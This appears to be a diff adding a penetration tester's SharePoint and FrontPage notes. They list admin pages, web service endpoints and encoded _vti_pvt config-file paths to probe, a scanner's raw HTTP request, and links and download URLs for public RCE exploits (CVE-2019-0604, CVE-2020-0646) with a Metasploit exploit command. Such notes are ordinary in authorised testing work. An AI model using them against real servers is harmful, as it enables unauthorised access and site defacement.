+_layouts/userdisp.aspx?Force=True&id=20
+_catalogs/wp/Forms/AllItems.aspx
+_layouts/viewlsts.aspx
+_layouts/userdisp.aspx?ID=1
+_layouts/userdisp.aspx
+_layouts/spcf.aspx
+_Layouts/RedirectPage.aspx
+_layouts/recyclebin.aspx
+_layouts/people.aspx?MembershipGroupId=0
+_layouts/MyInfo.aspx
+_layouts/mobile/mbllists.aspx
+_layouts/mcontent.aspx
+_layouts/help.aspx
+_layouts/groups.aspx
+_layouts/bpcf.aspx
+_layouts/aclinv.aspx
+_vti_bin/dws.asmx
+_vti_bin/alerts.asmx?wsdl
+_vti_bin/Authentication.asmx
+_vti_bin/copy.asmx
+_vti_bin/diagnostics.asmx
+_vti_bin/forms.asmx
+_vti_bin/imaging.asmx
+_vti_bin/lists.asmx
+_vti_bin/meetings.asmx
+_vti_bin/People.asmx
+_vti_bin/permissions.asmx
+_vti_bin/SiteData.asmx
+_vti_bin/sites.asmx
+_vti_bin/spsearch.asmx
+_vti_bin/UserGroup.asmx
+_vti_bin/views.asmx
+_vti_bin/WebPartPages.asmx
+_vti_bin/webs.asmx
+_layouts/AdminRecycleBin.aspx
+_layouts/create.aspx
+_layouts/listfeed.aspx
+_layouts/managefeatures.aspx
+_layouts/mcontent.aspx
+_layouts/mngsiteadmin.aspx
+_layouts/mngsubwebs.aspx
+_layouts/newsbweb.aspx
+_layouts/PageSettings.aspx
+_layouts/policy.aspx
+_layouts/policyconfig.aspx
+_layouts/policycts.aspx
+_layouts/Policylist.aspx
+_layouts/settings.aspx
+_layouts/sitemanager.aspx
+_layouts/storman.aspx
+_layouts/vsubwebs.aspx
+_layouts/wrkmng.aspx
+admin/_layouts
+_catalogs/wp/forms/allitems.aspx
+_layouts/AreaTemplateSettings.aspx
+_layouts/mngctype.aspx
+_layouts/mngfield.aspx
+_layouts/prjsetng.aspx
+_layouts/quiklnch.aspx
+_layouts/themeweb.aspx
+_layouts/addrole.aspx
+_layouts/permsetup.aspx
+
+
+
+/_vti_pvt%5caccess.cnf
+/_vti_pvt%5csvcacl.cnf
+/_vti_pvt%5cwriteto.cnf
+/_vti_pvt%5cservice.cnf
+/_vti_pvt%5cservices.cnf
+/_vti_pvt%5cbotinfs.cnf
+/_vti_pvt%5cbots.cnf
+/_vti_pvt%5clinkinfo.cnf
+
+
+#######################################################################
+FrontPage Server Extensions Anonymous Login Scanner
+This module queries the FrontPage Server Extensions and determines whether anonymous access is allowed.
+
+
+Module Name
+auxiliary/scanner/http/frontpage_login
+
+#######################################################################
+
+Security Risk
+It is possible to upload, modify or delete web pages,
+scripts and files on the web server
+
+
+Possible Causes
+Improper permissions/ACLs were set to file/directory
+
+
+Technical Description
+FrontPage defines three kinds of users for every
+FrontPage web: administrators, authors and browsers
+(end-users). All permissions are cumulative; all
+authors also have browsing permission, and all
+administrators also have authoring and browsing
+permissions. In FrontPage, the list of administrators,
+authors and browsers is defined on a per-web basis.
+All content in a FrontPage web will be accessible to
+the same set of users and groups. It is not possible
+to control permissions on a per-file or per-directory
+basis with FrontPage. All FrontPage sub-webs either
+inherit the permissions (list of administrators,
+authors and browsers) of the FrontPage root web or use
+their own, unique permissions. Each FrontPage web
+(including each sub-web) contains copies of three
+ISAPI DLLs that make up the FrontPage Sever
+Extensions. These DLLs are created in directories
+below the top-level directory of a FrontPage web: 
+[1] _vti_bin/_vti_adm/admin.dll for administrative
+tasks 
+[2] _vti_bin/_vti_aut/author.dll for authoring
+FrontPage webs 
+[3] _vti_bin/shtml.dll for browse-time FrontPage
+components such as form handlers. 
+
+These files must be set with restrictive permissions
+in order not to allow site defacement, since the files
+can be used to modify the web content remotely. 
+
+
+this is what the scanner send:
+GET /_vti_bin/_vti_aut/author.exe HTTP/1.0
+Cookie: ASP.NET_SessionId=nenizo45ytkot245dfgcaq45
+Accept: */*
+Accept-Language: en-us
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows
+NT 5.0)
+Host: www.cimmyt.org
+
+
+#######################################################################
+Sparty - MS Sharepoint and Frontpage Auditing Tool
+
+
+http://sparty.secniche.org/
+
+https://dl.packetstormsecurity.net/9910-exploits/webfolders.txt
+
+https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
+
+
+
+#######################################################################
+Code injection in Workflows leading to SharePoint RCE (CVE-2020-0646)
+
+
+https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/
+
+
+https://github.com/rapid7/metasploit-framework/pull/13122
+
+ Do: use exploit/windows/http/sharepoint_workflows_xoml
+
+
+#######################################################################
+
+
+SharePoint Serving the Hacker
+
+
+https://hackmag.com/security/sharepoint-serving-the-hacker/
+
+
+
+
+
+#######################################################################
+RCE
+
+
+Exploit CVE 2019 0604 SharePoint GetShell Exploit
+
+https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2019-0604-SharePoint-GetShell-Exploit
+
+https://www.cnblogs.com/k8gege/p/11093992.html
+
+CVE-2019-0604 Microsoft SharePoint RCE Exploit
+
+https://github.com/k8gege/CVE-2019-0604
+
+
+
+Original (English): https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
+
+Translation (Chinese): https://www.anquanke.com/post/id/173476
+
+
+download:
+
+ https://github.com/k8gege/CVE-2019-0604
+
+ https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py
+
+
+SharePoint CVE-2019–0604 RCE Exploitation
+
+https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d
+
+#######################################################################
+Penetration testing Sharepoint
+
+https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
+
+#######################################################################
